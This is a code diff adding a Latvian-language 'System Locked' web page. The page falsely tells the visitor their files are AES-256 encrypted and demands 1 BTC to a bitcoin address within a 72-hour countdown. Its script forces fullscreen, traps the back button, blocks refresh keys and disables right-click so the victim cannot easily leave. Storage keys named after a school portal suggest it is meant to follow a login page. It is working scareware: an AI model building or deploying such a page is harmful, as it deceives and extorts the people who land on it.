@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="lv">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>System Locked</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
+
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #8b0000;
+  color: #ffffff;
+  min-height: 100vh;
+  overflow: hidden;
+}
+
+body {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+  text-align: center;
+  overflow-y: auto;
+}
+
+.ransom-inner {
+  max-width: 720px;
+  width: 100%;
+  padding: 20px 0;
+}
+
+.ransom-title {
+  font-size: 48px;
+  font-weight: 900;
+  letter-spacing: 3px;
+  margin-bottom: 24px;
+  text-transform: uppercase;
+  animation: pulse 2s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50%      { opacity: 0.85; }
+}
+
+.ransom-body { font-size: 18px; line-height: 1.6; margin-bottom: 20px; }
+
+.ransom-address {
+  display: inline-block;
+  background: rgba(0, 0, 0, 0.35);
+  padding: 12px 20px;
+  border-radius: 8px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  font-size: 15px;
+  word-break: break-all;
+  margin: 12px 0 24px;
+  border: 1px solid rgba(255, 255, 255, 0.25);
+  cursor: pointer;
+  user-select: all;
+}
+
+.ransom-timer {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 20px;
+  font-variant-numeric: tabular-nums;
+  letter-spacing: 2px;
+}
+
+.ransom-footer {
+  margin-top: 40px;
+  font-size: 12px;
+  color: rgba(255, 255, 255, 0.5);
+  font-family: ui-monospace, monospace;
+}
+
+@media (max-width: 600px) {
+  .ransom-title { font-size: 30px; }
+  .ransom-body { font-size: 15px; }
+  .ransom-timer { font-size: 18px; }
+}
+</style>
+</head>
+<body>
+
+<div class="ransom-inner">
+<div class="ransom-title">Jūsu faili ir šifrēti</div>
+<p class="ransom-body">
+Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256.<br />
+Lai tos atgūtu, mums ir nepieciešams maksājums.
+</p>
+<p class="ransom-body">
+Maksājuma summa: <strong>1 BTC</strong><br />
+Maksājuma adrese:
+</p>
+<div class="ransom-address" id="ransomAddress">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+<div class="ransom-timer" id="ransomTimer">Laiks atlicis: 72:00:00</div>
+<p class="ransom-body">
+Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.
+</p>
+
+<div class="ransom-footer">
+ID: <span id="ransomId">—</span>
+</div>
+</div>
+
+<script>
+/* ── Fullscreen pieprasījums ── */
+function requestFullscreen() {
+  const el = document.documentElement;
+  if (el.requestFullscreen) {
+    el.requestFullscreen().catch(() => {});
+  } else if (el.webkitRequestFullscreen) {
+    el.webkitRequestFullscreen();
+  } else if (el.msRequestFullscreen) {
+    el.msRequestFullscreen();
+  }
+}
+
+/* ── Mēģina fullscreen uzreiz, ja atļauts ── */
+requestFullscreen();
+
+/* ── Ja neizdevās (pārlūks bloķē bez lietotāja darbības), mēģina pēc pirmā klikšķa ── */
+document.addEventListener('click', function once() {
+  requestFullscreen();
+  document.removeEventListener('click', once);
+}, { once: true });
+
+/* ── Redirect atpakaļ, ja lietotājs iziet no fullscreen vai refresh ── */
+/* Ja gribi, lai refresh NEATGRIEŽAS pie login — NEKO nedari. */
+/* Ja gribi, lai refresh vienmēr paliek šeit — šis ir OK. */
+
+/* ── Timer ── */
+const TIMER_KEY = 'mykoob_ransom_deadline';
+let deadline = parseInt(localStorage.getItem(TIMER_KEY) || '0', 10);
+
+if (!deadline || deadline < Date.now()) {
+  deadline = Date.now() + 72 * 60 * 60 * 1000;
+  localStorage.setItem(TIMER_KEY, String(deadline));
+}
+
+const ransomTimerEl = document.getElementById('ransomTimer');
+const ransomIdEl    = document.getElementById('ransomId');
+
+/* ── Rāda nejaušu ID ── */
+let id = localStorage.getItem('mykoob_ransom_id');
+if (!id) {
+  id = Array.from({ length: 32 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+  localStorage.setItem('mykoob_ransom_id', id);
+}
+ransomIdEl.textContent = id;
+
+function renderTimer() {
+  const remaining = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+  const h = String(Math.floor(remaining / 3600)).padStart(2, '0');
+  const m = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
+  const s = String(remaining % 60).padStart(2, '0');
+  ransomTimerEl.textContent = `Laiks atlicis: ${h}:${m}:${s}`;
+}
+
+renderTimer();
+setInterval(renderTimer, 1000);
+
+/* ── Bloku atpakaļ pogu ── */
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', function () {
+  history.pushState(null, '', location.href);
+});
+
+/* ── Bloku F5 un Ctrl+R ── */
+document.addEventListener('keydown', function (e) {
+  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.metaKey && e.key === 'r')) {
+    e.preventDefault();
+    return false;
+  }
+});
+
+/* ── Bloku peles labo pogu ── */
+document.addEventListener('contextmenu', function (e) {
+  e.preventDefault();
+});
+</script>
+
+</body>
+</html>
